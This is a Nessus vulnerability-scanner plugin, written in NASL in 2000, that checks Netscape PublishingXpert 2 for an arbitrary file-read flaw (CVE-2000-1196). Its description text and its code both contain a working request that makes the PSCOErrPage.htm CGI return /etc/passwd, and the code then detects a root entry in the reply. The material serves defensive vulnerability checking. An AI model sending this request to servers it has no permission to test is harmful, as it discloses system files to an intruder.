#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10364);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-2000-1196");
 name["english"] = "netscape publishingXpert 2 PSUser problem";
 name["francais"] = "netscape publishingXpert 2 PSUser problem";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The '/PSUser/PSCOErrPage.htm' CGI allows a 
malicious user to view any file on the target computer by issuing
a GET request :

GET  /PSUser/PSCOErrPage.htm?errPagePath=/file/to/read

Solution : Remove it

Risk factor : Medium
";

 desc["francais"] = "Le CGI '/PSUser/PSCOErrPage.htm' permet à un 
pirate de lire n'importe quel fichier sur la machine cible
au travers de la commande :

GET  /PSUser/PSCOErrPage.htm?errPagePath=/file/to/read

Facteur de risque : Moyen/Elevé

Solution : Supprimez cette page";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks if /PSUser/PSCOErrPage.htm reads any file";
 summary["francais"] = "Détermine si /PSUser/PSCOErrPage.htm lit n'importe quel fichier";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(get_port_state(port))
{
  req = http_get(item:"/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd", port:port);
  result = http_keepalive_send_recv(port:port, data:req);
  if ( result == NULL ) exit(0);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:result))security_warning(port);
}

